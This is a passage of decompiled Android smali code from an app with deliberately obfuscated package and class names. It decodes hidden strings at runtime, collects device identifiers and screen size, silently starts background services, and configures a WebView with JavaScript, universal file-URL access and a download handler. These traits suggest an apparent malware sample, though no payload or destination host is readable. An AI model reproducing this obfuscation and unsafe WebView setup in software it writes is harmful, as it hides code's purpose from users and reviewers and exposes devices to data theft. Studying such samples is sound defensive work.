    invoke-direct {p1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/t1;-><init>(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;)V

    sget-object v6, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cc;->a:Ljava/lang/String;

    filled-new-array {v6}, [Ljava/lang/String;

    move-result-object v6

    invoke-static {p1, v1, v6}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k;->d(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$b;I[Ljava/lang/String;)V

    new-instance p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/u1;

    invoke-direct {p1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/u1;-><init>(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;)V

    sget-object v6, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cc;->b:Ljava/lang/String;

    filled-new-array {v6}, [Ljava/lang/String;

    move-result-object v6

    invoke-static {p1, v1, v6}, Lcom/vknnolqo/p9sv5zvf/HhmXUb1k;->d(Lcom/vknnolqo/p9sv5zvf/HhmXUb1k$b;I[Ljava/lang/String;)V

    new-instance p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/gv;

    invoke-direct {p1, p0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/gv;-><init>(Landroid/content/Context;)V

    invoke-static {p1}, Ljava/lang/Thread;->setDefaultUncaughtExceptionHandler(Ljava/lang/Thread$UncaughtExceptionHandler;)V

    const/4 p1, 0x2

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v6

    new-instance v7, Landroid/graphics/Point;

    invoke-direct {v7}, Landroid/graphics/Point;-><init>()V

    invoke-virtual {p0}, Landroid/app/Activity;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v8

    invoke-interface {v8}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v8

    invoke-virtual {v8, v7}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V

    const/4 v8, 0x4

    new-array v9, v8, [B

    fill-array-data v9, :array_9

    new-array v10, v3, [B

    fill-array-data v10, :array_a

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    iget v10, v7, Landroid/graphics/Point;->x:I

    invoke-static {v10}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v10

    invoke-static {v6, v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-array v8, v8, [B

    fill-array-data v8, :array_b

    new-array v9, v3, [B

    fill-array-data v9, :array_c

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    iget v7, v7, Landroid/graphics/Point;->y:I

    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v8, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->requestWindowFeature(I)Z

    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v7

    const/16 v8, 0x400

    invoke-virtual {v7, v8, v8}, Landroid/view/Window;->setFlags(II)V

    invoke-direct {p0}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->g()V

    new-array v7, p1, [B

    fill-array-data v7, :array_d

    new-array v8, v3, [B

    fill-array-data v8, :array_e

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-static {v6, v7, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-nez v7, :cond_7

    invoke-static {v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->d(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    new-array v8, p1, [B

    fill-array-data v8, :array_f

    new-array v9, v3, [B

    fill-array-data v9, :array_10

    invoke-static {v8, v9}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-static {v6, v8, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_2

    :catch_0
    move-exception v0

    goto :goto_3

    :cond_7
    :goto_2
    invoke-static {v6, v0, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-nez v7, :cond_8

    sget-object v7, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->USR_MAIL:Ljava/lang/String;

    invoke-static {v6, v0, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :goto_3
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_8
    :goto_4
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->h(Landroid/content/Context;)Z

    move-result v0

    const/4 v6, -0x1

    if-nez v0, :cond_12

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->p:I

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->k:I

    invoke-virtual {p0, v0}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/TextView;

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v2

    invoke-virtual {v2}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v5

    const/16 v7, 0xc31

    const/4 v8, 0x3

    if-eq v5, v7, :cond_c

    const/16 v7, 0xca9

    if-eq v5, v7, :cond_b

    const/16 v4, 0xe7e

    if-eq v5, v4, :cond_a

    const/16 v4, 0xf2e

    if-eq v5, v4, :cond_9

    goto :goto_5

    :cond_9
    new-array v4, p1, [B

    fill-array-data v4, :array_11

    new-array v5, v3, [B

    fill-array-data v5, :array_12

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_d

    move v4, p1

    goto :goto_6

    :cond_a
    new-array v4, p1, [B

    fill-array-data v4, :array_13

    new-array v5, v3, [B

    fill-array-data v5, :array_14

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_d

    move v4, v8

    goto :goto_6

    :cond_b
    new-array v5, p1, [B

    fill-array-data v5, :array_15

    new-array v7, v3, [B

    fill-array-data v7, :array_16

    invoke-static {v5, v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_d

    goto :goto_6

    :cond_c
    new-array v4, p1, [B

    fill-array-data v4, :array_17

    new-array v5, v3, [B

    fill-array-data v5, :array_18

    invoke-static {v4, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_d

    move v4, v1

    goto :goto_6

    :cond_d
    :goto_5
    move v4, v6

    :goto_6
    const/16 v2, 0x4b

    if-eqz v4, :cond_11

    if-eq v4, v1, :cond_10

    if-eq v4, p1, :cond_f

    if-eq v4, v8, :cond_e

    new-array p1, v2, [B

    fill-array-data p1, :array_19

    new-array v1, v3, [B

    fill-array-data v1, :array_1a

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    :goto_7
    invoke-virtual {v0, p1}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_8

    :cond_e
    const/16 p1, 0x56

    new-array p1, p1, [B

    fill-array-data p1, :array_1b

    new-array v1, v3, [B

    fill-array-data v1, :array_1c

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto :goto_7

    :cond_f
    const/16 p1, 0x41

    new-array p1, p1, [B

    fill-array-data p1, :array_1d

    new-array v1, v3, [B

    fill-array-data v1, :array_1e

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto :goto_7

    :cond_10
    const/16 p1, 0x8f

    new-array p1, p1, [B

    fill-array-data p1, :array_1f

    new-array v1, v3, [B

    fill-array-data v1, :array_20

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto :goto_7

    :cond_11
    new-array p1, v2, [B

    fill-array-data p1, :array_21

    new-array v1, v3, [B

    fill-array-data v1, :array_22

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    goto :goto_7

    :goto_8
    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->l:I

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/ImageView;

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->e:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    sget p1, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->c:I

    invoke-virtual {p0, p1}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object p1

    check-cast p1, Landroid/widget/Button;

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->d:Landroid/view/View$OnClickListener;

    invoke-virtual {p1, v0}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    goto/16 :goto_c

    :cond_12
    :try_start_1
    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;

    move-result-object v0

    const/high16 v7, 0x1000000

    invoke-virtual {v0, v7, v7}, Landroid/view/Window;->setFlags(II)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->Is_Store:Ljava/lang/String;

    new-array v7, v1, [B

    const/16 v8, 0xa

    aput-byte v8, v7, v4

    new-array v8, v3, [B

    fill-array-data v8, :array_23

    invoke-static {v7, v8}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1a

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    const-class v0, Lcom/vknnolqo/p9sv5zvf/GJhyvSVC;

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v1

    const/16 v2, 0x1a

    if-nez v1, :cond_14

    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v2, :cond_13

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_9

    :cond_13
    invoke-virtual {p1, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_14
    :goto_9
    const-class v0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v1

    if-nez v1, :cond_16

    new-instance v1, Landroid/content/Intent;

    invoke-direct {v1, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v2, :cond_15

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_a

    :cond_15
    invoke-virtual {p1, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_16
    :goto_a
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/y80;->b()Z

    move-result v0

    const-class v1, Lcom/vknnolqo/p9sv5zvf/CtKus0KT;

    if-eqz v0, :cond_17

    invoke-static {p1, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ba;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_19

    :cond_17
    new-instance v0, Landroid/content/Intent;

    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v1, v2, :cond_18

    invoke-static {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v;->a(Landroid/content/Context;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_b

    :cond_18
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_19
    :goto_b
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    :cond_1a
    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/p30;->o:I

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->a:I

    invoke-virtual {p0, v0}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    iput-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    sget v0, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/c30;->n:I

    invoke-virtual {p0, v0}, Landroid/app/Activity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/widget/ProgressBar;

    iput-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->b:Landroid/widget/ProgressBar;

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setLoadsImagesAutomatically(Z)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setLoadWithOverviewMode(Z)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0, v4}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setCacheMode(I)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowFileAccessFromFileURLs(Z)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowUniversalAccessFromFileURLs(Z)V

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowContentAccess(Z)V

    :try_start_2
    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0, p1, v2}, Landroid/webkit/WebView;->setLayerType(ILandroid/graphics/Paint;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    sget-object v0, Landroid/webkit/WebSettings$PluginState;->ON:Landroid/webkit/WebSettings$PluginState;

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setPluginState(Landroid/webkit/WebSettings$PluginState;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    sget-object v0, Landroid/webkit/WebSettings$RenderPriority;->HIGH:Landroid/webkit/WebSettings$RenderPriority;

    invoke-virtual {p1, v0}, Landroid/webkit/WebSettings;->setRenderPriority(Landroid/webkit/WebSettings$RenderPriority;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {p1, v6}, Landroid/webkit/WebView;->setBackgroundColor(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1, v4}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ov;->c()Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ov;

    move-result-object p1

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/BuZckswr;->HOME_NAME:Ljava/lang/String;

    invoke-virtual {p1, v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/ov;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iput-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->g:Ljava/lang/String;

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$c;

    invoke-direct {v0, p0}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$c;-><init>(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;)V

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setDownloadListener(Landroid/webkit/DownloadListener;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$e;

    invoke-direct {v0, p0}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$e;-><init>(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;)V

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    new-instance v0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$f;

    invoke-direct {v0, p0, v2}, Lcom/vknnolqo/p9sv5zvf/Zw20l03q$f;-><init>(Lcom/vknnolqo/p9sv5zvf/Zw20l03q;Lcom/vknnolqo/p9sv5zvf/Zw20l03q$a;)V

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    iget-object p1, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object p1

    invoke-virtual {p1}, Landroid/webkit/WebSettings;->getUserAgentString()Ljava/lang/String;

    move-result-object p1

    iget-object v0, p0, Lcom/vknnolqo/p9sv5zvf/Zw20l03q;->f:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/webkit/WebSettings;->setUserAgentString(Ljava/lang/String;)V

